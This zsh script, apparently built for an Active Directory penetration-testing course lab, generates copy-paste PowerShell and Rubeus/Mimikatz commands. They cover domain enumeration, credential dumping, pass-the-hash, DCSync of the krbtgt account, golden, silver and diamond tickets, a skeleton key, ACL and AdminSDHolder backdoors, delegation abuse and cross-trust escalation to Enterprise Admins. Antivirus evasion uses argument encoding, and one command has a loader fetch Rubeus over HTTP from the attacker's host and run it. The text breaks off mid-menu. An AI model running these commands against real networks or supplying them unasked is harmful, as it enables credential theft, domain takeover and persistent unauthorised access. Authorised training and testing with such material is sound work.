#!/usr/bin/env zsh

############################################################# 
# nb-ad-pwsh
#############################################################
nb-ad-pwsh-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-pwsh
------------
The nb-ad-pwsh namespace contains commands for powershell/powerview commands to copy/paste to a windows machine.

PowerView Enumeration
---------------------
nb-ad-pwsh-enum-domain         PowerView domain enumeration commands
nb-ad-pwsh-enum-userhunt       PowerView user session hunting enumeration commands
nb-ad-pwsh-enum-users          PowerView user and computer enumeration commands
nb-ad-pwsh-enum-acls           Powerview ACLs rights enumeration like kerberoasts, DCsync etc.

Lateral Movement
----------------
nb-ad-pwsh-psremoting          connect via PSRemoting to a target host
nb-ad-pwsh-av-bypass           AV evasion powershell commands
nb-ad-pwsh-file-download       select one of general commands to download a payload into a target machine
nb-ad-pwsh-dump-secrets        dump secrets on windows machine using Invoke-Mimi.ps1

Domain Privilege Escalation
---------------------------
nb-ad-pwsh-opth                execute over-pass-the-hash with Rubeus.exe
nb-ad-pwsh-pth                 execute pass-the-hash with Invoke-Mimi.ps1
nb-ad-pwsh-ptt                 execute pass-the-ticket with Rubeus
nb-ad-pwsh-dcsync              execute DCSync attack with SafetyKatz for krbtgt user
nb-ad-pwsh-kerberoasting-set-spn   targeted kerberoasting with set SPN
nb-ad-pwsh-unconstrained       unconstrained delegation
nb-ad-pwsh-constrained-user    constrained delegation for user
nb-ad-pwsh-constrained-machine    constrained delegation for machine
nb-ad-pwsh-rbcd                resource-based constrained delegation

Privilege Escalation to Enterprise Admins
-----------------------------------------
nb-ad-pwsh-ea-trust-tickets       across trusts - child to parent using trust tickets
nb-ad-pwsh-ea-krbtgt-hash         across trusts - child to parent using krbtgt hash

Domain Persistence
------------------
nb-ad-pwsh-persist-acls        persistence through ACL rights
nb-ad-pwsh-persist-golden      create a golden ticket
nb-ad-pwsh-persist-silver      create a silver ticket
nb-ad-pwsh-persist-diamond     create a diamond ticket
nb-ad-pwsh-persist-skeleton    create a skeleton key (not opsec safe nor recommended)

Misc
----
nb-ad-cmd-winrs                connect via winrs to a target host
nb-ad-cmd-ping                 sweep a network subnet with ping requests on windows
nb-ad-pwsh-ping                sweep a network subnet with ping requests on windows powershell

DOC
}

nb-ad-pwsh-persist-acls() {
    clear

    __warn "Load PowerView with:"
    __ok ". .\\PowerView.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"

    echo
    __ask "PowerView check for domain PrivEsc vectors:"
    echo "1. Give user DCSync rights"
    echo "2. Security Descriptors - Give user access rights to a machine without explicit credentials (WinRM and PSRemoting)"
    echo "3. Security Descriptors - Remote Registry"
    echo "4. Give user AdminSDHolder rights"
    echo
    echo -n "Choose a command to copy: "
    read choice

    case $choice in
        1) 
          echo
          __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
          local dn && __askvar dn DN
          __ask "Enter user whom you want to add the DCSync rights"
          nb-vars-set-user
          __ask "Enter the current domain name"
          nb-vars-set-domain
          echo
          __info "Command to add DCSync rights to a ${__USER} copied to clipboard:"
          __COMMAND="Add-DomainObjectAcl -TargetIdentity '$dn' -PrincipalIdentity ${__USER} -Rights DCSync -PrincipalDomain ${__DOMAIN} -TargetDomain ${__DOMAIN} -Verbose"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          echo
          __info "You can check if the user has now applied rights using command:"
          __ok "Get-DomainObjectAcl -SearchBase\"$dn\" -SearchScope Base -ResolveGUIDs | ?{(\$_.ObjectAceType -match 'replication-get') -or (\$_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {\$_ | Add-Member NoteProperty'IdentityName' \$(Convert-SidToName \$_.SecurityIdentifier);\$_} | ?{\$_.IdentityName -match "${__USER}"}"
          echo
          __info "You can then run DCSync attack with that user:"
          __ok "nb-ad-pwsh-dcsync"
          ;;
        2) 
          echo
          __warn "You need to load RACE toolkit in powershell:"
          __ok ". .\\\\RACE.ps1"
          __ok ". .\\\\Set-RemotePSRemoting.ps1"
          echo
          __ask "Enter the target DC hostname"
          nb-vars-set-rhost
          __ask "Enter the user whom you want to add the ACL rights to"
          nb-vars-set-user
          nb-vars-set-domain
          echo
          __info "WMI access to ${__USER} without explicit credentials copied to clipboard:"
          __COMMAND="Set-RemoteWMI -SamAccountName ${__USER} -ComputerName ${__RHOST} -namespace 'root\cimv2' -Verbose"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          echo
          echo
          __info "PSRemoting access to ${__USER} without explicit credentials:"
          __ok "Set-RemotePSRemoting -SamAccountName ${__USER} -ComputerName ${__RHOST}.${__DOMAIN} -Verbose"
          ;;
        3) 
          echo
          __warn "You need to load the following scripts in powershell:"
          __ok ". .\\\\Add-RemoteRegBackdoor"
          __ok ". .\\\\RemoteHashRetrieval"
          echo
          __ask "Enter the user whom you want to add the ACL rights to"
          nb-vars-set-user
          __ask "Enter the target DC hostname"
          nb-vars-set-rhost
          echo
          __info "Command to use DAMP with admin privs on remote machine (Domain Admin privs) copied to clipboard:"
          __COMMAND="Add-RemoteRegBackdoor -ComputerName ${__RHOST} -Trustee ${__USER} -Verbose"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          echo
          __info "Retrieve machine account hash:"
          __ok "Get-RemoteMachineAccountHash -ComputerName ${__RHOST} -Verbose"
          echo
          __info "Retrieve local account hash:"
          __ok "Get-RemoteLocalAccountHash -ComputerName ${__RHOST} -Verbose"
          echo
          __info "Retrieve domain cached credentials:"
          __ok "Get-RemoteCachedCredential -ComputerName ${__RHOST} -Verbose"
          ;;
        4)
          echo
          __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
          local dn && __askvar dn DN
          nb-vars-set-domain
          __ask "Enter the user whom you want to add the ACL rights to"
          nb-vars-set-user
          echo
          __info "Command to add ${__USER} with FullControl privileges copied to clipboard:"
          __COMMAND="Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,$dn' -PrincipalIdentity ${__USER} -Rights All -PrincipalDomain ${__DOMAIN} -TargetDomain ${__DOMAIN} -Verbose"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          echo
          __info "Instead of waiting 1hour, you can kick off the process manually using Powershell:"
          __ok "Import-Module .\\Invoke-SDPropagator.ps1"
          __ok "Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose"
          echo
          __info "You can check if user got generic all against domain admins group:"
          __ok "Get-ObjectAcl -Identity \"Domain Admins\" -ResolveGUIDs | Where ActiveDirectoryRights -like \"GenericAll\" | %{ ConvertFrom-SID $_.SecurityIdentifier }"
          echo
          __info "Then, just add the user to DA group"
          __ok "Add-DomainGroupMember -Identity 'Domain Admins' -Members ${__USER} -Verbose"
          echo
          __info "To abuse ResetPassword using PowerView:"
          __ok "Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString \"Password@123\" -AsPlainText -Force ) -Verbose"
          ;;
        5) return;;
        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-persist-acls; return;;
    esac
}

nb-ad-pwsh-persist-skeleton() {
    __warn "Load Invoke-Mimi with:"
    __ok ". .\\Invoke-Mimi.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"
    echo

    __ask "Enter the current Domain name"
    nb-vars-set-domain
    __ask "Enter the target DC hostname"
    local hostname && __askvar hostname HOSTNAME

    __COMMAND="Invoke-Mimi -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName $hostname.${__DOMAIN}"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    __info "Now, it is possible to access any machine with a valid username and password as \"mimikatz\":"
    __ok "Enter-PSSession -Computername dcorp-dc -credential dcorp\\\\Administrator"
}

nb-ad-pwsh-persist-diamond() {
    __check-project

    __warn "You must use an elevated command prompt."
    echo

    __ask "Enter the current Domain name"
    nb-vars-set-domain
    __ask "Enter the target DC hostname"
    local hostname && __askvar hostname HOSTNAME
    __ask "Enter the krbtgt's AES256 or RC4 hash"
    __check-hash

    echo
    __warn "Encode the following command with: .\\\\ArgSplit.bat:"
    __ok "diamond"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /krbkey:${__HASH} /tgtdeleg /enctype:aes /ticketuser:administrator /domain:${__DOMAIN} /dc:$hostname.${__DOMAIN} /ticketuserid:500 /groups:512 /createnetonly:C:\\\\Windows\\\\System32\\\\cmd.exe /show /ptt"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    __info "Check if we can access target machine with command:"
    __ok "nb-ad-cmd-winrs"
}

nb-ad-pwsh-persist-silver() {
    __check-project

    __warn "You must use an elevated command prompt."
    echo

    __ask "Enter the current Domain name"
    nb-vars-set-domain
    __ask "Enter the target DC hostname"
    local hostname && __askvar hostname HOSTNAME
    __ask "Enter the Domain SID of the current domain"
    local sid1 && __askvar sid1 DomainSID
    __ask "Enter the target machine's RC4 or AES256 hash"
    __check-hash

    echo
    __warn "Encode the following command with: .\\\\ArgSplit.bat:"
    __ok "silver"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /service:http/$hostname.${__DOMAIN} /rc4:${__HASH} /sid:$sid1 /ldap /user:Administrator /domain:${__DOMAIN} /ptt"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    __info "Try accessing the service using winrs"
    __ok "nb-ad-cmd-winrs"
}

nb-ad-pwsh-persist-golden() {
    __check-project

    __warn "You must use an elevated command prompt."
    echo

    __ask "Enter the current Domain name"
    nb-vars-set-domain
    __ask "Enter the target DC hostname"
    local hostname && __askvar hostname HOSTNAME
    __ask "Enter the Domain SID of the current domain"
    local sid1 && __askvar sid1 DomainSID
    __ask "Enter the krbtgt's AES256 hash"
    __check-hash

    echo
    __warn "Encode the following command with: .\\\\ArgSplit.bat:"
    __ok "kerberos::golden"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    __COMMAND="C:\\\\AD\\\\Tools\\\\BetterSafetyKatz.exe -args \"%Pwn% /User:Administrator /domain:${__DOMAIN} /sid:$sid1 /aes256:${__HASH} /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\""

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    __info "Check if the TGS is injected:"
    __ok "klist"
    echo
    __info "Check access on the target system:"
    __ok "dir \\\\\\$hostname\\\\c\$"
}

nb-ad-pwsh-ea-krbtgt-hash() {
    __check-project

    __warn "You must use an elevated command prompt."
    echo

    __ask "Enter the current Domain name"
    nb-vars-set-domain
    __ask "Enter the Parent Domain name"
    local dom && __askvar dom PARENT_DOMAIN
    __ask "Enter the Domain SID of the current domain"
    local sid1 && __askvar sid1 DomainSID
    __ask "Enter the Domain SID of the parent domain"
    local sid2 && __askvar sid2 ParentDomainSID
    __ask "Enter the hostname of parent DC"
    local hostname && __askvar hostname HOSTNAME
    __ask "Enter the netbios name ex. dcorp"
    local nb && __askvar nb NETBIOS_NAME
    __ask "Enter the krbtgt's AES256 hash"
    __check-hash

    echo
    __warn "Encode the following command with: .\\\\ArgSplit.bat:"
    __ok "golden"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /user:Administrator /id:500 /domain:${__DOMAIN} /sid:$sid1 /sids:$sid2 /aes256:${__HASH} /netbios:$nb /ptt"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    __info "Check if we can access the parent domain machine with command:"
    __ok "nb-ad-cmd-winrs"
}

nb-ad-pwsh-ea-trust-tickets() {
    __check-project

    __warn "You must use an elevated command prompt."
    echo

    __warn "NOTE: The prerequisite of export the trust key between the child and the parent domain is having DA access, you can get it using OPTH:"
    __ok "nb-ad-pwsh-opth"
    echo

    __ask "Enter the current Domain name"
    nb-vars-set-domain
    __ask "Enter the Parent Domain name"
    local dom && __askvar dom PARENT_DOMAIN
    __ask "Enter the Domain SID of the current domain"
    local sid1 && __askvar sid1 DomainSID
    __ask "Enter the Domain SID of the parent domain"
    local sid2 && __askvar sid2 ParentDomainSID
    __ask "Enter the hostname of parent DC"
    local hostname && __askvar hostname HOSTNAME
    __ask "Enter the Administrator's RC4 hash"
    __check-hash

    echo
    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
    __ok "kerberos::golden"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    __COMMAND="C:\\\\AD\\\\Tools\\\\BetterSafetyKatz.exe -args \"%Pwn% /user:Administrator /domain:${__DOMAIN} /sid:${sid1} /sids:${sid2}-519 /rc4:${__HASH} /service:krbtgt /target:$dom /ticket:C:\\\\AD\\\\Tools\\\\trust_tkt.kirbi\" \"exit\""

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command to Forge a ticket with SID History of Enterprise Admins copied to clipboard"
    __ok "$__COMMAND"
    echo
    __warn "Now, encode the following command with: .\\\\ArgSplit.bat:"
    __ok "asktgs"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"
    echo
    __info "To use the ticket with Rubeus:"
    __ok "C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /ticket:C:\\\\AD\\\\Tools\\\\trust_tkt.kirbi /service:cifs/$hostname.$dom /dc:$hostname.$dom /ptt"
    echo
    __info "Check if we can access the parent domain machine:"
    __ok "dir \\\\mcorp-dc.moneycorp.local\\c$"
}

nb-ad-pwsh-rbcd() {
    __check-project
    __info "Find a user that has write permission over a computer object (check ObjectDN's first 'CN='):"
    __ok "nb-ad-pwsh-enum-acls"
    echo
    __warn "You must first log into the user that has write permissions, you can do that with OPTH:"
    __ok "nb-ad-pwsh-opth"
    echo
    __warn "Load PowerView with:"
    __ok ". .\\PowerView.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"
    echo
    __ask "Enter the hostname of computer object over which the user has write permissions"
    local hostname && __askvar hostname HOSTNAME
    __ask "Enter my windows machine's hostname to give myself write permissions"
    local hostname2 && __askvar hostname2 HOSTNAME
    echo
    __info "Command to set RBCD on target machine for the student:"
    __ok "Set-DomainRBCD -Identity ${hostname} -DelegateFrom '${hostname2}$' -Verbose"
    echo
    __info "You can check if RBCD is set correctly:"
    __ok "Get-DomainRBCD"
    echo
    __info "Next, you need to get AES256 keys of your machine which you gave the write permissions to using command:"
    __ok "nb-ad-pwsh-dump-secrets"
    echo
    __ask "Enter the AES256 hash of your machine"
    __check-hash
    echo
    __warn "Encode the following command with: .\\\\ArgSplit.bat:"
    __ok "s4u"
    echo
    __info "Now, abuse the RBCD to access target machine as Domain Administrator - Administrator"
    __ok "C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /user:$hostname2\$ /aes256:${__HASH} /msdsspn:http/$hostname /impersonateuser:administrator /ptt"
    echo
    __info "Check if we can access target machine with command:"
    __ok "nb-ad-cmd-winrs"
}

nb-ad-pwsh-constrained-machine() {
    __check-project
    __info "Enumerate the computer accounts with constrained delegation enabled with command:"
    __ok "nb-ad-pwsh-enum-acls"
    echo
    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
    __ok "s4u"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"
    echo
    __ask "Enter machine hostname with constrained delegation enabled"
    nb-vars-set-user
    __ask "Enter the AES256 version of machine's hash"
    __check-hash
    __ask "Enter the msds-allowedtodelegateto ex. TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL"
    local value && __askvar value VALUE

    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /user:${__USER} /aes256:${__HASH} /impersonateuser:Administrator /msdsspn:$value /altservice:ldap /ptt"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command to Abuse Constrained Delegation using ${__USER} copied to clipboard:"
    __ok "$__COMMAND"
    echo
    __info "Now run the dcsync command to abuse the LDAP ticket:"
    __ok "nb-ad-pwsh-dcsync"
}

nb-ad-pwsh-constrained-user() {
    __check-project
    __info "Enumerate users in the domain for whom Constrained Delegation is enabled with command:"
    __ok "nb-ad-pwsh-enum-acls"
    echo
    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
    __ok "s4u"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"
    echo
    __ask "Enter user with constrained delegation enabled"
    nb-vars-set-user
    __ask "Enter the AES256 version of user's hash"
    __check-hash
    __ask "Enter the msds-allowedtodelegateto ex. CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL"
    local value && __askvar value VALUE

    __COMMAND="C:\\AD\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /user:${__USER} /aes256:${__HASH} /impersonateuser:Administrator /msdsspn:\"$value\" /ptt"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command to request a TGS for ${__USER} as the Domain Administrator - Administrator:"
    __ok "$__COMMAND"
    echo
    __info "Check if the TGS is injected:"
    __ok "klist"
    echo
    __info "Try accessing filesystem on $value:"
    __ok "dir \\\\\\$value\\\\c\$"
}

nb-ad-pwsh-unconstrained() {
    __check-project
    __warn "NOTE: the prerequisite for elevation using unconstrained delegation is having admin access shell to the machine."
    echo
    __info "You can check which machine allows for unconstrained delegation with command:"
    __ok "nb-ad-pwsh-enum-acls"
    echo
    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
    __ok "monitor"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"
    echo
    __ask "Enter the DC's hostname"
    nb-vars-set-rhost
    nb-vars-set-lhost
    nb-vars-set-domain
    echo
    __ask "Enter the listening machine hostname"
    local ma && __askvar ma HOSTNAME

    __COMMAND=".\\\\Loader.exe -path http://${__LHOST}/Rubeus.exe -args %Pwn% /targetuser:${__RHOST}$ /interval:5 /nowrap C:\\\\Users\\\\Public\\\\Rubeus.exe monitor /targetuser:${__RHOST}$ /interval:5 /nowrap"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command to run Rubeus in listener mode copied to clipboard:"
    __ok "$__COMMAND"
    echo
    __info "Next you need to use command to force authentication to of the DC to the listener machine:"
    __ok ".\\\\MS-RPRN.exe \\\\\\\\${__RHOST}.${__DOMAIN} \\\\\\\\${ma}.${__DOMAIN}"
}

nb-ad-pwsh-kerberoasting-set-spn() {
    __check-project
    __info "You can enumerate the permissions for Users on ACLs with command:"
    __ok "nb-ad-pwsh-enum-acls"
    echo
    __ask "Enter username which you want to set the SPN to"
    nb-vars-set-user

    __COMMAND="Set-DomainObject -Identity ${__USER} -Set @{serviceprincipalname=‘dcorp/whatever1'}"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command to set a SPN for the user (must be unique for the domain):"
    __ok "$__COMMAND"
    echo
    __info "Next you need to request TGS hash for offline cracking hashcat:"
    __ok "Get-DomainUser -Identity ${__USER} | Get-DomainSPNTicket | select -ExpandProperty Hash"
    echo
    __info "Then use the command to crack it:"
    __ok "nb-crack-hashcat"
}

nb-ad-pwsh-enum-acls() {
    clear

    __warn "Load PowerView with:"
    __ok ". .\\PowerView.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"

    echo
    __ask "PowerView check for domain PrivEsc vectors:"
    echo "1. Kerberoast"
    echo "2. Targeted kerberoasting - SET SPN"
    echo "3. Check if user has DCSync rights"
    echo "4. Unconstrained delegation"
    echo "5. Constrained delegation for user"
    echo "6. Constrained delegation for machine"
    echo "7. Resource-based constrained delegation"
    echo "8. AS-REP Roast"
    echo "9. Return to previous menu"
    echo
    echo -n "Choose a command to copy: "
    read choice

    case $choice in
        1) 
          echo
          __info "Command to check kerberoastable users copied to clipboard:"
          __COMMAND="Get-DomainUser -SPN"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          ;;
        2) 
          echo
          __info "Enumerate the permissions for RDPUsers on ACLs - check the ObjectDN's first 'CN=' value:"
          __COMMAND="Find-InterestingDomainAcl -ResolveGUIDs | ?{\$_.IdentityReferenceName -match \"RDPUsers\"}"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          echo
          __info "You can check the user already has a SPN set with command:"
          __ok "Get-DomainUser -Identity <USERNAME> | select serviceprincipalname"
          ;;
        3) 
          echo
          __ask "Enter user to check for DCsync rights"
          nb-vars-set-user
          __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
          local dn && __askvar dn DN
          __COMMAND="Get-DomainObjectAcl -SearchBase \"${dn}\" -SearchScope Base -ResolveGUIDs | ?{(\$_.ObjectAceType -match 'replication-get') -or (\$_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {\$_ | Add-Member NoteProperty 'IdentityName' \$(Convert-SidToName \$_.SecurityIdentifier);\$_} | ?{\$_.IdentityName -match \"${__USER}\"}"
          echo
          __info "Command to check if the user has DCSync rights copied to clipboard:"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          ;;
        4)
          echo
          __info "Commadn to check which machine allows for unconstrained delegeation:"
          __COMMAND="Get-DomainComputer -Unconstrained | select -ExpandProperty name"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          ;;
        5) 
          echo
          __info "Command to enumerate users in the domain for whom Constrained Delegation is enabled:"
          __COMMAND="Get-DomainUser -TrustedToAuth"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          ;;
        6) 
          echo
          __info "Command to enumerate computer accounts in the domain for which Constrained Delegation is enabled:"
          __COMMAND="Get-DomainComputer -TrustedToAuth"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          ;;
        7) 
          echo
          __ask "Enter user whom you want to check for write permissions"
          nb-vars-set-user
          echo
          __info "Command to find a computer object in dcorp domain where the user has write permissions over given computer object:"
          __COMMAND="Find-InterestingDomainACL | ?{\$_.identityreferencename -match '${__USER}'}"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          ;;
        8) 
          echo
          __info "Command to enumerate accounts with Kerberos Preauth disabled:"
          __COMMAND="Get-DomainUser -PreauthNotRequired -Verbose"
          echo "$__COMMAND" | wl-copy
          __ok "$__COMMAND"
          ;;
        9) return;;
        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-acls; return;;
    esac
}

nb-ad-pwsh-dcsync() {
    __check-project
    __info "You can check if user has DCSync rights with command:"
    __ok "nb-ad-pwsh-enum-acls"
    echo

    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
    __ok "lsadump::dcsync"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn% /user:dcorp\\\\krbtgt\" \"exit\""

    echo "$__COMMAND" | wl-copy
    echo
    __info "To dump all users, use flag /all, to specify a list of users use: /user:user1 /user:user2"
    __info "Command to run DCSync and extract krbtgt's hashes:"
    __ok "$__COMMAND"
    echo
    __info "You can run DCSync with Invoke-Mimi.ps1:"
    __ok "Invoke-Mimi -Command '\"lsadump::dcsync /user:tech\krbtgt\"'"
    echo
}

nb-ad-pwsh-pth() {
    __warn "Load Invoke-Mimi with:"
    __ok ". .\\Invoke-Mimi.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"
    echo

    __ask "Enter the target machine hostname"
    local hostname && __askvar hostname HOSTNAME
    nb-vars-set-user
    __ask "Enter the user's NTLM Hash"
    __check-hash

    __COMMAND="Invoke-Mimi -Command '\"sekurlsa::pth /domain:$hostname /user:${__USER} /ntlm:${__HASH} /run:powershell.exe\"'"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
}

nb-ad-pwsh-opth() {
    __check-project
    nb-vars-set-domain
    nb-vars-set-user
    __ask "Enter AES256 version of the hash"
    __check-hash

    echo
    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
    __ok "asktgt"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /domain:${__DOMAIN} /user:${__USER} /aes256:${__HASH} /opsec /createnetonly:C:\\\\Windows\\\\System32\\\\cmd.exe /show /ptt"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command to run Over pass-the-hash copied to clipboard:"
    __ok "$__COMMAND"
}

nb-ad-pwsh-ptt() {
    __check-project

    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
    __ok "ptt"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /ticket:"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Enter the base64-encoded ticket in place of /ticket"
    __info "Run from elevated shell:"
    __ok "$__COMMAND"
}

nb-ad-pwsh-enum-users() {
    clear

    __warn "Load PowerView with:"
    __ok ". .\\PowerView.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"

    echo
    __ask "PowerView Users and Computers Enumeration Commands:"
    echo "1. Get the description field from the users"
    echo "2. List all computers and their OS versions"
    echo "3. List all users"
    echo "4. List member computers in the domain"
    echo "5. List members of the Domain Admins group"
    echo "6. List members of the Enterprise Admins group"
    echo "7. Return to previous menu"
    echo
    echo -n "Choose a command to copy: "
    read choice

    case $choice in
        1) __COMMAND="Get-NetUser | Select-Object samaccountname,description";;
        2) __COMMAND="Get-NetComputer | select samaccountname, operatingsystem, operatingsystemversion";;
        3) __COMMAND="Get-DomainUser | select -ExpandProperty samaccountname";;
        4) __COMMAND="Get-DomainComputer | select -ExpandProperty dnshostname";;
        5) __COMMAND="Get-DomainGroupMember -Identity \"Domain Admins\"";;
        6) __COMMAND="Get-DomainGroupMember -Identity \"Enterprise Admins\" -Domain moneycorp.local";;
        7) return;;
        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-users; return;;
    esac

    echo "$__COMMAND" | wl-copy
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    sleep 1
    nb-ad-pwsh-enum-users
}

nb-ad-pwsh-enum-userhunt() {
    clear

    __warn "Load PowerView with:"
    __ok ". .\\PowerView.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"

    echo
    __ask "PowerView User Hunting Commands:"
    echo "1. Find all the local admin accounts on all the machines (Required Admin rights on non-DC machines)"
    echo "2. Find Local Admin sessions for the current user"
    echo "3. Find Local Admin sessions with PSRemoting for the current user"
    echo "4. Find Domain Admin sessions for the current user"
    echo "5. Return to previous menu"
    echo
    echo -n "Choose a command to copy: "
    read choice

    case $choice in
        1) __COMMAND="Invoke-EnumerateLocalAdmin | select ComputerName, AccountName, IsDomain, IsAdmin";;
        2) __COMMAND="Find-LocalAdminAccess";;
        3) nb-vars-set-domain
          __COMMAND=". C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1; Find-PSRemotingLocalAdminAccess -Domain ${__DOMAIN} -Verbose"
          ;;
        4) __COMMAND="Find-DomainUserLocation";;
        5) return;;
        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-userhunt; return;;
    esac

    echo "$__COMMAND" | wl-copy
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    sleep 1
    nb-ad-pwsh-enum-userhunt
}

nb-ad-pwsh-enum-domain() {
    clear

    __warn "Load PowerView with:"
    __ok ". .\\PowerView.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"

    echo
    __ask "PowerView Domain Enumeration Commands:"
    echo "1. Get current domain"
    echo "2. Get Domain SID for the current domain"
    echo "3. Get Domain SID for the foreign domain"
    echo "4. Get information of the Domain Controller"
    echo "5. Return to previous menu"
    echo
    echo -n "Choose a command to copy: "
    read choice

    case $choice in
        1) __COMMAND="Get-NetDomain";;
        2) __COMMAND="Get-DomainSID";;
        3) 
          echo
          nb-vars-set-domain
          __COMMAND="Get-DomainSID -Domain ${__DOMAIN}"
          ;;
        4) __COMMAND="Get-NetDomainController";;
        5) return;;
        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-domain; return;;
    esac

    echo "$__COMMAND" | wl-copy
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    sleep 1
    nb-ad-pwsh-enum-domain
}

nb-ad-pwsh-dump-secrets() {
    clear
    __warn "You must use an elevated command prompt."

    echo
    __warn "Load Invoke-Mimi with:"
    __ok ". .\\\\Invoke-Mimi.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"

    echo
    __warn "If you're using SafetyKatz.exe, you need to encode the command with: .\\\\ArgSplit.bat for example:"
    __ok "sekurlsa::logonpasswords"
    __ok "sekurlsa::ekeys"
    __ok "lsadump::lsa"
    __ok "lsadump::trust"
    echo
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    echo
    __ask "Choose a command to copy:"
    echo "1. Invoke-Mimi -Command '\"sekurlsa::logonpasswords\"'"
    echo "2. Invoke-Mimi -Command '\"sekurlsa::ekeys\"'"
    echo "3. Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'"
